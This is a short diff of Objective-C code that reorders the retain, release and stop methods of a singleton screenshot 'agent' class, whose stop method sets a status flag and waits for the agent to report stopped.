@@ -212,20 +212,15 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   return self;
 }
 
-- (id)retain
-{
-  return self;
-}
-
 - (unsigned)retainCount
 {
   // Denotes an object that cannot be released
   return UINT_MAX;
 }
 
-- (void)release
+- (id)retain
 {
-  // Do nothing
+  return self;
 }
 
 - (id)autorelease
@@ -233,9 +228,31 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   return self;
 }
 
+- (void)release
+{
+  // Do nothing
+}
+
 #pragma mark -
 #pragma mark Agent Formal Protocol Methods
 #pragma mark -
+
+- (BOOL)stop
+{
+  int internalCounter = 0;
+  
+  [mAgentConfiguration setObject: AGENT_STOP
+                          forKey: @"status"];
+  
+  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
+         && internalCounter <= mSleepSec)
+  {
+    internalCounter++;
+    sleep(1);
+  }
+  
+  return YES;
+}
 
 - (void)start
 {
@@ -252,23 +269,6 @@ static __m_MAgentScreenshot *sharedAgentScreenshot = nil;
   [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
 
   [outerPool release];
-}
-
-- (BOOL)stop
-{
-  int internalCounter = 0;
-
-  [mAgentConfiguration setObject: AGENT_STOP
-                          forKey: @"status"];
-  
-  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= mSleepSec)
-    {
-      internalCounter++;
-      sleep(1);
-    }
-  
-  return YES;
 }
 
 - (BOOL)resume
